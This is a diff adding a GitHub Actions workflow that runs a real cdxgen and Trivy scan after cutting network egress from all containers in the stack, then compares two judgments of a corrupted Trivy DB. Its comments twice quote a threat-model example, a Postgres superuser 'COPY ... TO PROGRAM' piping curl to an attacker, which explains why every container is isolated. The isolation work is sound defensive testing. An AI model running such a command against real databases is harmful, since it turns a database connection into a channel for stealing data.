@@ -1,0 +1,528 @@
+# Air-gapped scan: run a real cdxgen + Trivy source scan with the whole
+# stack's network egress cut (postgres, redis, backend, AND the worker - not
+# the worker alone), after the Trivy DB cache has been populated.
+#
+# Context: `dogfood-scan.yml` already runs the real toolchain (`TRUSTEDOSS_SCAN_BACKEND:
+# real`) weekly, but that job keeps the runner's normal internet access the whole
+# time. A missing offline flag on an outbound tool call (for example a DB-refresh
+# invocation missing `--skip-db-update`) never shows up there, because the network
+# call it should not have made just succeeds quietly. This job exists to close
+# that specific gap: bring the stack up with network access, populate the Trivy DB
+# cache, then cut every container's egress and prove a real scan still completes
+# and the on-disk cache state is judged consistently by two different readers.
+#
+# Cutting only the worker (an earlier version of this job) left a live
+# exfiltration path: `POSTGRES_USER` is a superuser, and a scan-triggered
+# `COPY (SELECT 1) TO PROGRAM 'curl ... | attacker'` runs as a subprocess
+# INSIDE the postgres container, not the worker's - the worker's own
+# interface being cut does not stop it. All four long-running containers
+# (postgres, redis, backend, celery-worker) move onto the internal-only
+# network below; none keeps a route to the internet.
+#
+# Kept as a sibling workflow rather than a job appended to dogfood-scan.yml on
+# purpose. dogfood-scan answers "does our own scan action work end to end";
+# this answers "does a scan complete with no egress at all" - mixing the two
+# makes a red run ambiguous about which question failed.
+#
+# Reference: `~/projects/trusca-internal/docs/testing-hardening-plan-2026-08.md`,
+# type E ("offline operating mode"), unit "E1. egress-cut real scan job". The
+# metadata-judgement contrast step below is the "E1 internal contrast" that unit
+# E2 (`apps/backend/tests/unit/integrations/test_trivy_db_metadata_oracle.py`)
+# only pinned with a synthetic fixture; here it runs against a real,
+# freshly-downloaded Trivy DB and a real trivy binary.
+#
+# Follows docs-site/docs/admin-guide/vulnerability-data.md's Path B (fully
+# offline cache volume) shape as closely as a single-host CI job can: populate
+# the cache while connected, then operate on it with no network at all - the
+# whole single-node stack, matching a real air-gapped install, not just the
+# worker process. A later unit (E3, out of scope here) can point the docs-uat
+# waivers on that section at this job as the real-environment oracle.
+name: airgap-scan
+
+on:
+  schedule:
+    # Sunday 09:00 UTC - clear of install-uat (03:00) and dogfood-scan (07:00),
+    # so the three long weekly infra jobs do not compete for runner capacity.
+    - cron: "0 9 * * 0"
+  workflow_dispatch: {}
+
+permissions:
+  contents: read
+  packages: read
+
+concurrency:
+  group: airgap-scan-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  airgap-scan:
+    name: airgap-scan (egress-cut real scan)
+    runs-on: ubuntu-22.04
+    # Real cdxgen + Trivy + a real DB download, plus the network-surgery steps.
+    # The scanned tree here is apps/backend only (see the upload step), not the
+    # whole monorepo, so this should land well under dogfood-scan's 45 min, but
+    # the ceiling stays generous because a cold Trivy DB download and a first
+    # cdxgen run on a shared runner are not always fast.
+    timeout-minutes: 40
+    env:
+      TRUSTEDOSS_SCAN_BACKEND: real
+      # Pin so backend + worker sign/verify the same JWTs across containers.
+      SECRET_KEY: airgap-scan-ci-secret-key-min-32-chars-padding-aabbcc
+      # The runner has a single egress IP; the bootstrap below does a
+      # register + login pair that would otherwise trip the 5/min login limiter.
+      RATELIMIT_DISABLED: "1"
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Verify docker-compose V1 available
+        run: docker-compose version
+
+      # Pre-build so a cold image cache surfaces as its own step. Only the scan
+      # path is needed: no frontend.
+      - name: Pre-build dev images (backend + worker)
+        uses: ./.github/actions/dev-images
+        with:
+          services: backend celery-worker
+          token: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Start postgres + redis
+        run: docker-compose -f docker-compose.dev.yml up -d postgres redis
+
+      - name: Wait for postgres healthy
+        run: |
+          set -euo pipefail
+          deadline=$(( $(date +%s) + 60 ))
+          while :; do
+            cid=$(docker-compose -f docker-compose.dev.yml ps -q postgres)
+            status=$(docker inspect --format '{{.State.Health.Status}}' "$cid" 2>/dev/null || echo "none")
+            [ "$status" = "healthy" ] && break
+            [ "$(date +%s)" -ge "$deadline" ] && { echo "::error::postgres never healthy"; exit 1; }
+            sleep 3
+          done
+
+      # The dev image CMD is bare uvicorn (no entrypoint), so AUTO_MIGRATE never
+      # runs - migrate explicitly against a throwaway container before boot.
+      - name: Run alembic migrations (pre-boot)
+        run: |
+          docker-compose -f docker-compose.dev.yml run --rm --no-deps backend \
+            alembic upgrade head
+
+      - name: Bring up backend + worker (network still open)
+        run: docker-compose -f docker-compose.dev.yml up -d backend celery-worker
+
+      - name: Wait for stack healthy
+        run: |
+          set -euo pipefail
+          services=(postgres redis backend celery-worker)
+          deadline=$(( $(date +%s) + 240 ))
+          while :; do
+            healthy=0
+            for svc in "${services[@]}"; do
+              cid=$(docker-compose -f docker-compose.dev.yml ps -q "$svc")
+              [ -z "$cid" ] && continue
+              status=$(docker inspect --format '{{.State.Health.Status}}' "$cid" 2>/dev/null || echo "none")
+              [ "$status" = "healthy" ] && healthy=$(( healthy + 1 ))
+            done
+            echo "healthy=$healthy/${#services[@]}"
+            [ "$healthy" -eq "${#services[@]}" ] && break
+            if [ "$(date +%s)" -ge "$deadline" ]; then
+              echo "::error::stack did not become healthy within 240s"
+              docker-compose -f docker-compose.dev.yml ps
+              exit 1
+            fi
+            sleep 5
+          done
+
+      # TRIVY_DB_BOOTSTRAP_ON_START defaults true, so the worker's `worker_ready`
+      # hook already fired `trivy --download-db-only` in the background once it
+      # started consuming the queue. Wait for the on-disk metadata to land before
+      # cutting egress - the whole point of this job is a scan against an
+      # already-populated cache, not a scan that races a download it can no
+      # longer make.
+      - name: Wait for the Trivy DB to populate (network still open)
+        run: |
+          set -euo pipefail
+          deadline=$(( $(date +%s) + 180 ))
+          while :; do
+            if docker-compose -f docker-compose.dev.yml exec -T celery-worker \
+                 test -s /var/lib/trivy/db/metadata.json; then
+              break
+            fi
+            if [ "$(date +%s)" -ge "$deadline" ]; then
+              echo "::error::Trivy DB metadata.json did not appear within 180s"
+              docker-compose -f docker-compose.dev.yml exec -T celery-worker \
+                ls -la /var/lib/trivy/db/ || true
+              exit 1
+            fi
+            sleep 5
+          done
+          docker-compose -f docker-compose.dev.yml exec -T celery-worker \
+            cat /var/lib/trivy/db/metadata.json
+
+      # Bootstrap a fresh user (register auto-creates a personal org+team when
+      # AUTH_REGISTER_CREATES_TEAM is on - default) and register a project with
+      # no git_url: this job scans via the upload path (below), not a worker-side
+      # git clone, which would itself need egress the worker is about to lose.
+      - name: Bootstrap project
+        run: |
+          set -euo pipefail
+          api="http://localhost:8000"
+          email="airgap-$(date +%s)@trustedoss.dev"
+          password="AirgapCI-$(openssl rand -hex 12)"
+
+          curl -fsS -X POST "$api/auth/register" \
+            -H 'Content-Type: application/json' \
+            -d "$(jq -nc --arg e "$email" --arg p "$password" \
+                  '{email: $e, password: $p, full_name: "Airgap Scan CI"}')" >/dev/null
+
+          jwt=$(curl -fsS -X POST "$api/auth/login" \
+            -H 'Content-Type: application/json' \
+            -d "$(jq -nc --arg e "$email" --arg p "$password" '{email: $e, password: $p}')" \
+            | jq -r '.access_token')
+          [ -n "$jwt" ] && [ "$jwt" != "null" ] || { echo "::error::login returned no token"; exit 1; }
+
+          team_id=$(curl -fsS "$api/auth/me" -H "Authorization: Bearer $jwt" \
+            | jq -r '.memberships[0].team_id')
+          [ -n "$team_id" ] && [ "$team_id" != "null" ] || { echo "::error::no team membership (AUTH_REGISTER_CREATES_TEAM off?)"; exit 1; }
+
+          project_id=$(curl -fsS -X POST "$api/v1/projects" \
+            -H "Authorization: Bearer $jwt" -H 'Content-Type: application/json' \
+            -d "$(jq -nc --arg t "$team_id" \
+                  '{team_id: $t, name: "Airgap Scan CI", slug: "airgap-scan-ci"}')" \
+            | jq -r '.id')
+          [ -n "$project_id" ] && [ "$project_id" != "null" ] || { echo "::error::project create failed"; exit 1; }
+
+          echo "::add-mask::$jwt"
+          {
+            echo "AIRGAP_PROJECT_ID=$project_id"
+            echo "AIRGAP_JWT=$jwt"
+          } >> "$GITHUB_ENV"
+          echo "Bootstrapped project $project_id"
+
+      # ---------------------------------------------------------------------
+      # Cut ALL FOUR containers' egress, not just the worker's.
+      #
+      # docker-compose (V1) has no per-service "detach this network" verb, and
+      # hand-rolling `docker run` replicas of each service's env vars and
+      # volume mounts here would drift from docker-compose.dev.yml the first
+      # time a service definition changes. Live network reattachment on the
+      # running containers gets the same end state - every service reachable
+      # only through an `internal: true` network - without duplicating that
+      # config:
+      #   1. create a bridge network with no external gateway (--internal)
+      #   2. for each of postgres, redis, backend, celery-worker: attach it
+      #      to airgap-internal under its compose service-name alias (so the
+      #      others can still resolve it), then disconnect it from whatever
+      #      network compose put it on (its only route to the internet)
+      #   3. restart backend + celery-worker so their DB/Redis connections
+      #      re-dial over the new network rather than sockets bound to an
+      #      interface that no longer exists. postgres/redis are pure
+      #      listeners (0.0.0.0) - not restarted, no outbound connection of
+      #      their own to re-establish
+      #
+      # An earlier version of this job cut only the worker's network, on the
+      # theory that the worker is the one running attacker-influenced code
+      # (cdxgen/Trivy against scanned source). That left a real exfiltration
+      # path: POSTGRES_USER is a superuser by default provisioning, and
+      # `COPY (SELECT 1) TO PROGRAM 'curl ... | attacker'` issued over the
+      # worker's DATABASE_URL connection runs as a subprocess INSIDE the
+      # still-internet-connected postgres container - the worker's own
+      # interface being cut does not stop it.
+      # ---------------------------------------------------------------------
+      - name: Cut all-container egress (recreate onto an internal-only network)
+        run: |
+          set -euo pipefail
+
+          docker network create --driver bridge --internal airgap-internal
+
+          for svc in postgres redis backend celery-worker; do
+            cid=$(docker-compose -f docker-compose.dev.yml ps -q "$svc")
+            [ -n "$cid" ] || { echo "::error::no running container for service $svc"; exit 1; }
+
+            default_net=$(docker inspect "$cid" \
+              --format '{{json .NetworkSettings.Networks}}' | jq -r 'keys[0]')
+            [ -n "$default_net" ] && [ "$default_net" != "null" ] || \
+              { echo "::error::could not resolve $svc's current network"; exit 1; }
+
+            docker network connect --alias "$svc" airgap-internal "$cid"
+            docker network disconnect "$default_net" "$cid"
+            echo "$svc: moved off $default_net onto airgap-internal"
+          done
+
+          docker-compose -f docker-compose.dev.yml restart backend celery-worker
+
+      # Structural proof, not a behavioural one: postgres:17.2-alpine and
+      # redis:7.4-alpine ship no curl/wget to probe with from inside, so this
+      # asserts directly on Docker's own network membership - the loop above
+      # disconnected each container from every network except the
+      # `--internal` one, which Docker never attaches a default route or NAT
+      # masquerade rule to. backend/celery-worker get the same check here
+      # plus a live curl-to-the-internet check below (both have curl).
+      - name: Verify all four containers are internal-only
+        run: |
+          set -euo pipefail
+          for svc in postgres redis backend celery-worker; do
+            cid=$(docker-compose -f docker-compose.dev.yml ps -q "$svc")
+            nets=$(docker inspect "$cid" --format '{{json .NetworkSettings.Networks}}' | jq -r 'keys | join(",")')
+            if [ "$nets" != "airgap-internal" ]; then
+              echo "::error::$svc is attached to network(s) other than airgap-internal: $nets"
+              exit 1
+            fi
+            echo "$svc: only on airgap-internal"
+          done
+
+      - name: Wait for backend + worker healthy again (egress-cut)
+        run: |
+          set -euo pipefail
+          services=(backend celery-worker)
+          deadline=$(( $(date +%s) + 180 ))
+          while :; do
+            healthy=0
+            for svc in "${services[@]}"; do
+              cid=$(docker-compose -f docker-compose.dev.yml ps -q "$svc")
+              status=$(docker inspect --format '{{.State.Health.Status}}' "$cid" 2>/dev/null || echo "none")
+              [ "$status" = "healthy" ] && healthy=$(( healthy + 1 ))
+            done
+            [ "$healthy" -eq "${#services[@]}" ] && break
+            [ "$(date +%s)" -ge "$deadline" ] && {
+              echo "::error::backend and/or celery-worker never became healthy again after the network cutover (postgres/redis may not be reachable over the internal network)"
+              docker-compose -f docker-compose.dev.yml logs --tail=100 backend celery-worker || true
+              exit 1
+            }
+            sleep 5
+          done
+
+      - name: Sanity-check egress is actually cut
+        run: |
+          set -euo pipefail
+          for svc in backend celery-worker; do
+            if docker-compose -f docker-compose.dev.yml exec -T "$svc" \
+                 curl -m 5 -sS https://ghcr.io/v2/ -o /dev/null; then
+              echo "::error::$svc can still reach the internet after the network cutover - the egress-cut step did not work, the rest of this job proves nothing"
+              exit 1
+            fi
+            echo "confirmed: $svc has no route to ghcr.io"
+          done
+
+      # Scan via the upload path (not git_url), so no worker-side git fetch is
+      # needed - only apps/backend is scanned; enough real Python dependencies
+      # for cdxgen + Trivy to do real work without scanning the whole monorepo.
+      #
+      # Every API call below runs INSIDE the backend container against its own
+      # loopback (docker-compose exec + curl http://localhost:8000/...), not
+      # `curl http://localhost:8000` from the runner. Disconnecting backend's
+      # default network above also tore down its published host port (8000):
+      # Docker's port-DNAT is bound to the network the container was started
+      # on, and reconnecting it elsewhere does not re-publish the port
+      # (confirmed locally with a throwaway container - see PR description).
+      # `docker-compose exec` itself goes through the Docker daemon socket,
+      # not the container's network stack, so it is unaffected either way.
+      - name: Upload source archive
+        run: |
+          set -euo pipefail
+          zip -qr /tmp/airgap-source.zip apps/backend \
+            -x 'apps/backend/tests/*' -x '**/__pycache__/*' -x '**/*.pyc'
+
+          backend_cid=$(docker-compose -f docker-compose.dev.yml ps -q backend)
+          docker cp /tmp/airgap-source.zip "$backend_cid:/tmp/airgap-source.zip"
+
+          archive_id=$(docker-compose -f docker-compose.dev.yml exec -T backend \
+            curl -fsS -X POST \
+              "http://localhost:8000/v1/projects/${AIRGAP_PROJECT_ID}/source-archive" \
+              -H "Authorization: Bearer ${AIRGAP_JWT}" \
+              -F "upload=@/tmp/airgap-source.zip;type=application/zip" \
+            | jq -r '.archive_id')
+          [ -n "$archive_id" ] && [ "$archive_id" != "null" ] || { echo "::error::archive upload failed"; exit 1; }
+          echo "AIRGAP_ARCHIVE_ID=$archive_id" >> "$GITHUB_ENV"
+          echo "Uploaded archive $archive_id"
+
+      - name: Trigger real source scan (whole stack has no egress)
+        run: |
+          set -euo pipefail
+          scan_id=$(docker-compose -f docker-compose.dev.yml exec -T backend \
+            curl -fsS -X POST \
+              "http://localhost:8000/v1/projects/${AIRGAP_PROJECT_ID}/scans" \
+              -H "Authorization: Bearer ${AIRGAP_JWT}" -H 'Content-Type: application/json' \
+              -d "$(jq -nc --arg a "$AIRGAP_ARCHIVE_ID" \
+                    '{kind: "source", metadata: {source_type: "upload", archive_id: $a}}')" \
+            | jq -r '.id')
+          [ -n "$scan_id" ] && [ "$scan_id" != "null" ] || { echo "::error::scan trigger failed"; exit 1; }
+          echo "AIRGAP_SCAN_ID=$scan_id" >> "$GITHUB_ENV"
+          echo "Triggered scan $scan_id"
+
+      - name: Poll for scan completion, assert it succeeded
+        run: |
+          set -euo pipefail
+          deadline=$(( $(date +%s) + 900 ))
+          status=""
+          while :; do
+            status=$(docker-compose -f docker-compose.dev.yml exec -T backend \
+              curl -fsS "http://localhost:8000/v1/scans/${AIRGAP_SCAN_ID}" \
+                -H "Authorization: Bearer ${AIRGAP_JWT}" | jq -r '.status')
+            echo "scan status: $status"
+            case "$status" in
+              succeeded|failed|cancelled) break ;;
+            esac
+            if [ "$(date +%s)" -ge "$deadline" ]; then
+              echo "::error::scan did not reach a terminal state within 900s (last status: $status)"
+              exit 1
+            fi
+            sleep 10
+          done
+          if [ "$status" != "succeeded" ]; then
+            echo "::error::real source scan with no egress anywhere in the stack ended '$status', expected 'succeeded'"
+            docker-compose -f docker-compose.dev.yml logs --tail=200 celery-worker || true
+            exit 1
+          fi
+          echo "scan completed successfully with the whole stack's network egress cut"
+
+      # ---------------------------------------------------------------------
+      # E1 internal contrast (see the header comment): compare, on the SAME
+      # cache directory, (a) the app's get_trivy_db_status() judgement and
+      # (b) the real trivy CLI's own acceptance of that cache - by asking it
+      # to re-run `--download-db-only` and observing whether it treats the
+      # existing DB as good enough to keep, now that egress is cut.
+      #
+      # Runs after the scan assertion above on purpose: this step corrupts
+      # the same cache the scan just used, and the scan result already stands.
+      # ---------------------------------------------------------------------
+      - name: E1 internal contrast - app verdict vs. real trivy CLI verdict
+        run: |
+          set -euo pipefail
+          DC="docker-compose -f docker-compose.dev.yml"
+
+          app_verdict() {
+            $DC exec -T backend python -c "
+          from integrations.trivy import get_trivy_db_status
+          print(get_trivy_db_status().freshness)
+          " | tr -d '\r\n'
+          }
+
+          # trivy exits 0 with no output when it judges the existing DB good
+          # enough to keep; it logs a "may be corrupted" warning and attempts
+          # a re-download (which fails - no egress) when it does not. That
+          # log line, not the exit code alone, is what carries the verdict:
+          # an unrelated network hiccup would also exit non-zero.
+          cli_rejects() {
+            $DC exec -T celery-worker \
+              trivy image --download-db-only --cache-dir /var/lib/trivy \
+              > /tmp/cli-verdict.log 2>&1 || true
+            cat /tmp/cli-verdict.log
+            grep -qi "may be corrupted" /tmp/cli-verdict.log
+          }
+
+          echo "--- baseline: freshly-downloaded, uncorrupted DB ---"
+          app_baseline=$(app_verdict)
+          echo "app verdict: $app_baseline"
+          if [ "$app_baseline" != "fresh" ]; then
+            echo "::error::app judged the freshly-downloaded DB as '$app_baseline', expected 'fresh' before any corruption is introduced - investigate before trusting the rest of this step"
+            exit 1
+          fi
+          if cli_rejects; then
+            echo "::error::real trivy CLI rejected the freshly-downloaded, uncorrupted DB - the harness's own baseline is broken, not the app under test"
+            exit 1
+          fi
+          echo "CLI verdict: accept"
+
+          echo "--- corrupting DownloadedAt to the Go zero-value, same as E2's fixture ---"
+          $DC exec -T celery-worker python -c "
+          import json
+          path = '/var/lib/trivy/db/metadata.json'
+          data = json.load(open(path))
+          data['DownloadedAt'] = '0001-01-01T00:00:00Z'
+          json.dump(data, open(path, 'w'))
+          "
+
+          app_corrupt=$(app_verdict)
+          echo "app verdict: $app_corrupt"
+          cli_rejected_corrupt=false
+          if cli_rejects; then
+            cli_rejected_corrupt=true
+            echo "CLI verdict: reject (may be corrupted, and cannot re-download with no egress)"
+          else
+            echo "CLI verdict: accept"
+          fi
+
+          # Judgement:
+          #  - CLI rejects, app still says fresh: the known, tracked mismatch
+          #    (Wave 1 E2, apps/backend/tests/unit/integrations/
+          #    test_trivy_db_metadata_oracle.py, xfail(strict=True) -
+          #    get_trivy_db_status() reads UpdatedAt/Version only and never
+          #    looks at DownloadedAt). Not a new finding - warn, do not fail.
+          #  - CLI rejects, app no longer says fresh: the E2 fix likely landed.
+          #    Fail loud so this carve-out and the E2 xfail both get removed
+          #    together, same as an xfail(strict=True) failing on an
+          #    unexpected pass.
+          #  - anything else: a genuinely new divergence between the two
+          #    judges. This step exists to catch exactly that - fail.
+          if [ "$cli_rejected_corrupt" = "true" ] && [ "$app_corrupt" = "fresh" ]; then
+            echo "::warning::known, tracked divergence reproduced against a real trivy binary: the CLI rejects a DownloadedAt=zero DB but get_trivy_db_status() still reports 'fresh'. Tracked in testing-hardening-plan-2026-08.md type E / unit E2 (apps/backend/tests/unit/integrations/test_trivy_db_metadata_oracle.py). Not failing this job for the known case - remove this carve-out once that fix lands."
+          elif [ "$cli_rejected_corrupt" = "true" ] && [ "$app_corrupt" != "fresh" ]; then
+            echo "::error::the CLI still rejects a DownloadedAt=zero DB, but get_trivy_db_status() now reports '$app_corrupt' instead of 'fresh' - this looks like the E2 bug got fixed. Remove the known-bug carve-out in this workflow (and the xfail(strict=True) in test_trivy_db_metadata_oracle.py) and turn this into a hard agreement assertion."
+            exit 1
+          else
+            echo "::error::unexpected divergence between the two judges: CLI verdict=$( [ "$cli_rejected_corrupt" = "true" ] && echo reject || echo accept ), app verdict=$app_corrupt. This does not match the tracked E2 case - investigate before waiving it."
+            exit 1
+          fi
+
+      - name: Job summary
+        if: always()
+        run: |
+          {
+            echo "## airgap-scan result"
+            echo ""
+            echo "| Field | Value |"
+            echo "|---|---|"
+            echo "| project | \`${AIRGAP_PROJECT_ID:-}\` |"
+            echo "| scan-id | \`${AIRGAP_SCAN_ID:-}\` |"
+          } >> "$GITHUB_STEP_SUMMARY"
+
+      - name: Dump compose logs on failure
+        if: failure()
+        run: docker-compose -f docker-compose.dev.yml logs --tail=300
+
+      - name: Tear down
+        if: always()
+        run: |
+          docker-compose -f docker-compose.dev.yml down -v || true
+          docker network rm airgap-internal || true
+
+  # The weekly run has no pull request to report on: a failure here means the
+  # egress-cut path itself broke (network surgery, DB bootstrap, or a real scan
+  # no longer completing offline), not a policy verdict. verify-specs went red
+  # for nine consecutive nights unnoticed before this alert pattern existed
+  # (see .github/actions/nightly-failure-issue) - a network-topology-changing
+  # job is exactly the kind of thing that must not fail silently.
+  weekly-alert:
+    name: weekly-alert
+    if: ${{ always() && github.event_name == 'schedule' }}
+    needs: airgap-scan
+    runs-on: ubuntu-22.04
+    timeout-minutes: 5
+    permissions:
+      contents: read
+      issues: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          sparse-checkout: .github/actions/nightly-failure-issue
+      - uses: ./.github/actions/nightly-failure-issue
+        with:
+          label: weekly-airgap-scan
+          title: "Weekly airgap-scan is failing"
+          failed: ${{ needs.airgap-scan.result == 'failure' && 'true' || 'false' }}
+          details: |
+            This weekly run is the only place a real cdxgen + Trivy source
+            scan is exercised with the whole stack's network egress cut
+            (postgres, redis, backend, and the worker) after the Trivy DB
+            cache is populated - the condition documented in
+            docs-site/docs/admin-guide/vulnerability-data.md's Path B
+            (fully offline cache volume).
+
+            A red run usually means one of: the network-cutover steps
+            (creating the internal-only Docker network, reattaching
+            containers) broke on a runner image change, the Trivy DB
+            bootstrap did not finish before egress was cut, or the scan
+            pipeline made a network call it should not have made while
+            offline. The step logs name which stage failed.
+          token: ${{ secrets.GITHUB_TOKEN }}
